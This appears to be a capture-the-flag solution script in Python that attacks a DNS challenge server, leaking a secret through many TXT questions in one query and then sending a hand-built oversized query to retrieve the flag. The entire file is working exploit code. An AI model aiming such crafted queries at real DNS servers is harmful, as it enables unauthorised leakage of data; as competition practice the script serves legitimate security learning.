#!/usr/bin/env python3

import struct

from dnslib import DNSRecord, DNSQuestion, QTYPE, EDNS0
from pwn import log, remote

HOST = "challs.umdctf.io"
PORT = 32323
K = 819


def send_and_recv_raw(io, payload):
    io.send(len(payload).to_bytes(2, "big") + payload)
    resp_len = int.from_bytes(io.recvn(2), "big")
    return io.recvn(resp_len)


def leak_secret(io):
    req = DNSRecord()
    for i in range(K):
        req.add_question(DNSQuestion(f"{i}.inside.info", QTYPE.TXT))

    # Response is large; advertise bigger UDP payload to avoid truncation.
    req.add_ar(EDNS0(udp_len=65535))
    resp = DNSRecord.parse(send_and_recv_raw(io, req.pack()))

    secret = [""] * K
    for rr in resp.rr:
        idx = int(str(rr.rname).split(".")[0])
        secret[idx] = b"".join(rr.rdata.data).decode()
    return "".join(secret)


def make_oversized_txt_query(domain_labels):
    header = struct.pack("!HHHHHH", 0xBEEF, 0x0100, 1, 0, 0, 0)
    qname = b"".join(bytes([len(label)]) + label.encode() for label in domain_labels) + b"\x00"
    question_tail = struct.pack("!HH", QTYPE.TXT, 1)
    return header + qname + question_tail


def main():
    log.info(f"Connecting to {HOST}:{PORT} ...")
    io = remote(HOST, PORT)

    secret = leak_secret(io)
    log.success(f"Leaked secret length: {len(secret)}")

    chunks = [secret[i : i + 63] for i in range(0, K, 63)]
    raw_query = make_oversized_txt_query(chunks + ["inside", "info"])

    answer = DNSRecord.parse(send_and_recv_raw(io, raw_query))
    io.close()

    if not answer.rr:
        raise RuntimeError("No TXT answer returned.")

    flag = b"".join(answer.rr[0].rdata.data).decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
